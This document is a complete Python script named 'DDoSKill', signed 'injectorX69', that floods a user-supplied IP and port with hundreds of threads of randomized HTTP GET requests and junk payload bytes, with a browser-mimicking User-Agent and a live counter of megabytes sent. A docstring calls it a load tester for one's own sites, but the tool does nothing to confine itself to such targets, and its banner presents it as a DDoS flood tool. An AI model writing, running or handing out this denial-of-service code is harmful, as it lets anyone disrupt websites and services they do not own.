#!/usr/bin/env python3
"""
DDoSKill - HTTP flood / load tester for your own websites
creat by injectorX69
"""

import socket
import threading
import random
import time
import sys
import os

if sys.platform == "win32":
    os.system("")

WHITE  = "\033[97m"
DIM    = "\033[37m"
RESET  = "\033[0m"

TITLE = """\
 ▄▄▄▄▄   ▄▄▄▄▄    ▄▄▄▄▄   ▄▄▄▄▄         ▄     ▄  ▐  ▄      ▄
 ▓    ▀▄ ▓    ▀▄ ▓     ▓ ▓              ▓     ▓  ░▌ █      █
 ▒     ▒ ▒     ▒ ▒     ▒ ▒              ▒     ▒ ▐■█ ▒      ▒
 ░     ░ ░     ░ ░     ░ ░▄▄▄▄▄         ░    ▄▀  ▀  ░      ░
 █     █ █     █ █     █      █ ▀▀▀▀▀▀▀▀ █▀▀▀▀▄   █  █      █
 ▓     ▓ ▓     ▓ ▓     ▓      ▓         ▓     ▓  ▓  ▓      ▓
 ▒     ▒ ▒     ▒ ▒     ▒      ▒         ▒     ▒  ▒  ▒      ▒
 ░▄▄▄▄▀  ░▄▄▄▄▀  ░▄▄▄▄▄░ ▄▄▄▄▄░         ░     ░  ░  ░▄▄▄▄▄ ░▄▄▄▄▄
"""

TOWER = """\
                                   |>>>
                                     |
                                 _  _|_  _
                                |;|_|;|_|;|
                                \\.    .  /
                                 \\\\:  .  /
                                  ||:   |
                                  ||:.  |
                                  ||:  .|
                                  ||:   |       \\,/
                                  ||: , |            /`\\
                                  ||:   |
                                  ||: . |
                 __                             _||_   |
        ____--`~    '--~~__            __ ----~    ~`---,              ___
    -~--~                   ~---__ ,--~'                  ~~----_____-~'   `~----~~
"""

BOX = """\

    ============================================================
        DDoSKill  ::  HTTP Flood Tool
        creat by injectorX69
    ============================================================
"""

FULL = TITLE + "\n" + TOWER + BOX

sent_count = 0
sent_lock = threading.Lock()
running = True


def worker(ip: str, port: int, size: int, duration: int, path: str) -> None:
    global sent_count
    payload = random.randbytes(size)
    deadline = time.time() + duration

    while time.time() < deadline and running:
        try:
            with socket.create_connection((ip, port), timeout=3) as s:
                req = (
                    f"GET /{path}?{random.randint(0, 999999):06d} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()
                while time.time() < deadline and running:
                    try:
                        s.sendall(req)
                        s.sendall(payload)
                        with sent_lock:
                            sent_count += len(req) + size
                    except OSError:
                        break
        except OSError:
            continue


def stats(duration: int) -> None:
    """Banner stays fixed, just a clean live MB counter below it."""
    global running
    start = time.time()
    frame = 0
    while time.time() - start < duration and running:
        time.sleep(1)
        with sent_lock:
            mb = sent_count / 1024 / 1024
        dots = "." * (frame % 4)
        print(f"  {WHITE}[{DIM}+{WHITE}] Sending{dots} {mb:8.2f} MB  "
              f"[{DIM}Ctrl+C stop{WHITE}]   {RESET}", end="\r", flush=True)
        frame += 1


def main() -> None:
    print(WHITE + FULL + RESET)
    try:
        ip       = input(f"  {WHITE}[?] Target IP:{RESET} ").strip()
        port     = int(input(f"  {WHITE}[?] Port {DIM}[80]{RESET}: ").strip() or 80)
        path     = input(f"  {WHITE}[?] Target path {DIM}[/]{RESET}: ").strip() or "/"
        size     = int(input(f"  {WHITE}[?] Data per request (bytes) {DIM}[1024]{RESET}: ").strip() or 1024)
        threads  = int(input(f"  {WHITE}[?] Threads {DIM}[200]{RESET}: ").strip() or 200)
        duration = int(input(f"  {WHITE}[?] Duration (seconds) {DIM}[60]{RESET}: ").strip() or 60)
    except ValueError:
        print(f"\n  {DIM}[!]{RESET} Invalid input, exiting.")
        sys.exit(1)

    print(f"\n  {WHITE}[*] Launching {threads} threads against {ip}:{port}...{RESET}\n")

    ts = [
        threading.Thread(target=worker, args=(ip, port, size, duration, path), daemon=True)
        for _ in range(threads)
    ]
    for t in ts:
        t.start()

    try:
        stats(duration)
    except KeyboardInterrupt:
        global running
        running = False

    with sent_lock:
        total = sent_count / 1024 / 1024
    print(f"\n\n  {WHITE}[=] Done. Total sent:{RESET} {total:.2f} MB")
    print(f"  {DIM}creat by injectorX69{RESET}\n")


if __name__ == "__main__":
    main()
